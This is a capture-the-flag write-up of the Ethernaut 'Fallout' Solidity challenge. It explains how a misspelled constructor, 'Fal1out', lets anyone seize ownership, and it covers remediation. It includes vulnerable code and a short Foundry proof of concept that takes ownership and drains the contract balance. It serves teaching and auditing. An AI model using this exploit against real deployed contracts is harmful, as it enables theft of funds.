# Fallout — Security Writeup

| | |
|---|---|
| **Challenge** | [Ethernaut 02 — Fallout](https://smartcontractshacking.com/tools/web3-ctf-challenges/ethernaut-fallout) |
| **Platform** | Smart Contracts Hacking (SCH) / OpenZeppelin Ethernaut |
| **Target** | `src/Fallout.sol` |
| **Solidity** | `^0.6.0` |
| **Severity** | Critical |
| **Status** | Exploited — local PoC passing |

---

## Executive summary

`Fallout` was meant to set `owner` in its constructor. The function that looks like a constructor is named `Fal1out` — the second `l` is the digit `1`. On Solidity `^0.6.0` that function is a normal `public` method, not a constructor.

The constructor never runs, so `owner` stays `address(0)` after deploy. Any account can call `Fal1out()` and take ownership. `collectAllocations()` then sends the full contract balance to the new owner.

**Impact:** complete ownership takeover (SCH goal) and theft of all ETH held by the contract.

---

## Challenge objectives

| # | Condition | How verified |
|---|-----------|--------------|
| 1 | Attacker becomes `owner` | `falloutInstance.owner() == PLAYER_ADDRESS` |

**Starting state (SCH / local harness):**

- `owner` = `address(0)` (no constructor ran)
- Player balance = `1 ether` (local test)

Official Ethernaut also ships `sendAllocation()` and `allocatorBalance()`. SCH omitted them. They are not needed to win.

---

## Contract overview

```solidity
contract Fallout {
    mapping(address => uint256) allocations;
    address payable public owner;

    Fal1out() payable        // intended constructor — actually public (bug)
    allocate() payable       // records deposits
    collectAllocations()     // onlyOwner — sends full balance to caller
}
```

**Privileged state:** only `owner` can call `collectAllocations()` and pull the contract's ETH.

---

## Finding

### [C-01] Incorrect constructor name — `Fal1out()` is a public initializer

| Field | Detail |
|-------|--------|
| **Severity** | Critical |
| **Bug class** | Access control / incorrect constructor name |
| **Location** | `src/Fallout.sol:12-15` (`Fal1out()`) |
| **CWE** | [CWE-665](https://cwe.mitre.org/data/definitions/665.html) — Improper Initialization |
| **SWC** | [SWC-118](https://swcregistry.io/docs/SWC-118) — Incorrect Constructor Name |

#### Description

Before Solidity 0.5, a constructor was a function with the same name as the contract. From 0.5 onward, only the `constructor` keyword creates a constructor.

This contract uses pragma `^0.6.0` and a function named `Fal1out` (digit `1`, not letter `l`), marked with a `/* constructor */` comment. The compiler treats it as an ordinary public function. It does not run at deployment.

#### Root cause

Two independent mistakes stack:

| Mistake | Effect |
|---------|--------|
| Typo `Fal1out` vs `Fallout` | Name does not match the contract even under the old constructor rule |
| Using a named function instead of `constructor` on 0.6 | Would still fail if spelled `Fallout()` — 0.5+ requires the keyword |

Result: `owner` is never initialized, and the "constructor" remains callable forever.

#### Vulnerable code

```12:15:web3-ctf-challenges/02-ethernaut-fallout/src/Fallout.sol
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }
```

There is no `constructor()` anywhere in the file.

#### Impact

1. **Ownership takeover** — any unprivileged EOA (or contract) can become `owner` with one call.
2. **Fund theft** — `collectAllocations()` sends the entire contract balance to the caller once they are owner:

```26:29:web3-ctf-challenges/02-ethernaut-fallout/src/Fallout.sol
    function collectAllocations() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }
```

SCH only requires (1). (2) is the production impact of the same bug.

#### Likelihood

**High.** One public call. No ETH required (`payable` but `msg.value` can be 0). No tokens, oracles, or timing.

#### Proof of concept

Local Foundry test: `test/FalloutExploit.t.sol`

```bash
cd web3-ctf-challenges/02-ethernaut-fallout
forge test --match-test testExploit -vv
```

**Result:**

```
[PASS] testExploit() (gas: 110877)
```

SCH submission snippet: `Exploit.s.sol` (root of challenge folder).

---

## Attack scenario

### Preconditions

- Attacker is an unprivileged EOA with enough ETH for gas.
- Contract has been deployed (owner is still `0x0`).

### Attack sequence

```
Attacker                          Fallout contract
   |                                      |
   |  (deploy: owner = 0x0)               |
   |                                      |
   |-- Fal1out() ------------------------>|  owner = attacker
   |                                      |
   |-- collectAllocations() ------------->|  balance → attacker  (optional)
   |                                      |
   v                                      v
 owner == attacker                  balance == 0
```

### Step-by-step (7-question gate)

| Step | Answer |
|------|--------|
| **1. Setup** | EOA with gas |
| **2. Call** | `Fal1out()` |
| **3. Result** | Attacker is `owner` |
| **4. Cost** | Gas only (no `msg.value` required) |
| **5. ROI** | Ownership of all funds the contract ever holds |
| **6. Privileged access?** | No |
| **7. Viable?** | Yes — trivial, deterministic, single transaction |

### State transitions

| Variable | After deploy | After `Fal1out()` | After `collectAllocations()` |
|----------|--------------|-------------------|------------------------------|
| `owner` | `address(0)` | **attacker** | attacker |
| `allocations[attacker]` | `0` | `0` (if `msg.value == 0`) | `0` |
| `address(this).balance` | e.g. `0.001 ether` (local) | unchanged | **`0`** |

---

## Exploit implementation

### SCH platform (`Exploit.s.sol`)

Paste only the `run()` body into the SCH editor — no imports or contract wrapper:

```solidity
function run() external {
    vm.startBroadcast(PLAYER_PRIVATE_KEY);

    falloutInstance.Fal1out();

    vm.stopBroadcast();
}
```

`Fal1out` is payable, but the win condition does not check `msg.value`. Call it with no ETH.

### Local Foundry test

Target is 0.6; the test is 0.8 and deploys via compiled bytecode. Full runnable PoC in `test/FalloutExploit.t.sol`:

```solidity
assertEq(falloutInstance.owner(), address(0));

falloutInstance.Fal1out();
falloutInstance.collectAllocations();

assertEq(falloutInstance.owner(), player);
assertEq(address(falloutInstance).balance, 0);
```

---

## Verification checklist

After exploit execution:

- [x] `falloutInstance.owner() == PLAYER_ADDRESS`
- [x] Contract was ownerless (`address(0)`) before the call
- [x] Local Foundry test passes (includes optional drain)

---

## Remediation

### Recommended fix

Use a real constructor. On 0.6:

```solidity
constructor() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
}
```

Delete `Fal1out()`. If a post-deploy initializer is required (proxies), use a dedicated `initialize()` with `initializer` / `reinitializer` guards — never an unprotected public function.

### Best practice

- Prefer `constructor` over named constructors (removed since 0.5).
- Diff function names against the contract name when reviewing old Solidity.
- Do not trust comments such as `/* constructor */`.
- Initialize privileged roles in code that cannot be called again.

---

## Audit checklist (what we missed in the vulnerable design)

| Check | Finding |
|-------|---------|
| Does a `constructor` exist? | No — only a public `Fal1out()` |
| All paths that set `owner` | One path, no access control |
| Uninitialized storage | `owner == address(0)` after deploy |
| Lookalike characters in identifiers | `l` vs `1` in `Fal1out` |
| Post-exploit impact | `collectAllocations()` enables full drain once owner is stolen |

---

## Key lessons

1. **Constructors are a keyword, not a naming convention** — on 0.5+ only `constructor()` runs at deploy.
2. **Typo'd identifiers are real bugs** — `Fal1out` vs `Fallout` is easy to miss in a monospace font.
3. **Comments are not code** — `/* constructor */` does not make a function a constructor.
4. **Uninitialized `owner` is `address(0)`** — if nothing set it at deploy, anyone may claim it.

> "Read ALL sibling functions. If `vote()` has a modifier, check `poke()`, `reset()`, `harvest()`. The missing modifier on the sibling IS the bug."

Here the sibling is the missing constructor: the only function that sets `owner` has no access control at all.

---

## References

- [OpenZeppelin Ethernaut — Fallout](https://ethernaut.openzeppelin.com/)
- [SCH Fallout challenge](https://smartcontractshacking.com/tools/web3-ctf-challenges/ethernaut-fallout)
- [SWC-118: Incorrect Constructor Name](https://swcregistry.io/docs/SWC-118)
- [Solidity 0.5.0 breaking changes — constructors](https://docs.soliditylang.org/en/v0.5.0/050-breaking-changes.html#constructors)
- Local artifacts: `Exploit.s.sol`, `script/Exploit.s.sol`, `test/FalloutExploit.t.sol`
